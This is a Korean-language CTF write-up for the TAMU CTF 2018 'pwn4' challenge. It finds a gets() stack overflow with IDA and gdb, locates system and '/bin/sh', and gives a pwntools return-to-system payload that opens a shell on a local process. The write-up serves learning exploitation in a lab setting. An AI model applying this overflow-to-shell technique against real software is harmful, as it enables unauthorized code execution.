## [TAMU CTF 2018] pwn4 풀이

- checksec을 통해 보호기법 확인하기

![image](https://user-images.githubusercontent.com/59410565/117286314-ff3ca980-aea3-11eb-8276-07332312b427.png)

32bit 파일이고, NX가 걸려있다. 따라서 RET 변조를 통해 문제를 해결할 수 있을 것 같다.



- IDA를 사용하여 pwn4 살펴보기

// main() 함수

![image](https://user-images.githubusercontent.com/59410565/117286910-b89b7f00-aea4-11eb-8479-832dae86a2e3.png)



// reduced_shell() 함수

![image](https://user-images.githubusercontent.com/59410565/117286980-cc46e580-aea4-11eb-87c8-d6eda7007bcd.png)

-> s 입력을 gets로 받기 때문에 길이 제한 없이 입력할 수 있다. 따라서 stack overflow가 발생하게 된다.

-> ebp-1Ch를 했으므로, s의 크기는 0x1C(28) byte이다. 즉, s + SFP(4) + RET(4)인 stack 구조를 가진다.

// ls() 함수

![image](https://user-images.githubusercontent.com/59410565/117287272-234cba80-aea5-11eb-96e6-c5d55c9847a5.png)

// cal() 함수

![image](https://user-images.githubusercontent.com/59410565/117287364-395a7b00-aea5-11eb-9987-19c87da3af38.png)

// pwn() 함수

![image](https://user-images.githubusercontent.com/59410565/117287412-46776a00-aea5-11eb-9a00-b5705d252971.png)

// whoami() 함수

![image](https://user-images.githubusercontent.com/59410565/117287500-6018b180-aea5-11eb-85eb-bd3766a8a406.png)



- system, "/bin/sh" 주소 구하기

![image](https://user-images.githubusercontent.com/59410565/117291254-b7b91c00-aea9-11eb-9eab-37564a2c9311.png)

IDA로 '/bin/sh' 주소는 쉽게 알 수 있었다. (**0x0804a038**)

![image](https://user-images.githubusercontent.com/59410565/117446939-cb32b880-af77-11eb-9757-cd8b18a9fe37.png)

system의 주소 또한 IDA를 통해 알 수 있었다. (**0x08048430**)



- gdb로 분석하기

![image](https://user-images.githubusercontent.com/59410565/117537581-ec111180-b03c-11eb-8f7e-5a6a4ab70fa4.png)

...

![image-20210508203840220](C:\Users\hyera\AppData\Roaming\Typora\typora-user-images\image-20210508203840220.png)

**[Break Point]**

- reduced_shell+0 : reduced_shell() 함수의 첫 번째 명령어
- reduced_shell+77 : gets() 함수 호출
- reduced_shell+403 : reduced_shell() 함수의 RET 명령어

![image-20210508204109695](C:\Users\hyera\AppData\Roaming\Typora\typora-user-images\image-20210508204109695.png)

esp 레지스터가 가리키고 있는 최상위 stack 주소는 0xffffd00c 이다. 이 영역에는 Return address(0x080487ad)가 저장되어 있다.

![image](https://user-images.githubusercontent.com/59410565/117537731-dfd98400-b03d-11eb-92ba-670f1b8e7652.png)

![image](https://user-images.githubusercontent.com/59410565/117537833-6c844200-b03e-11eb-8ef3-30dc43dae908.png)

s 변수의 위치는 0xffffcfec 이고, return address와 32byte 떨어져있다. 즉, 문자를 32개 이상 입력하면 return address를 덮어쓸 수 있다.

![image](https://user-images.githubusercontent.com/59410565/117537855-89b91080-b03e-11eb-975f-09c848dd0f16.png)

0xffffd00c 영역의 값이 바뀌었다.

![image](https://user-images.githubusercontent.com/59410565/117538196-0ac4d780-b040-11eb-811b-079baa162b3a.png)

![image](https://user-images.githubusercontent.com/59410565/117538360-cab22480-b040-11eb-9242-fc55d1a17992.png)

"/bin/sh" 와  system의 위치를 알 수 있었다.



- Payload

```python
from pwn import *

p = process('./pwn4')

system = 0x08048430
binsh = 0x0804a038

payload = 'A'*32 
payload += p32(system)
payload += 'BBBB'
payload += p32(binsh)

p.sendafter("> ", payload)
p.interactive()
```



- Exploit

![image](https://user-images.githubusercontent.com/59410565/117450673-83faf680-af7c-11eb-8709-1d35fe46ea5b.png)

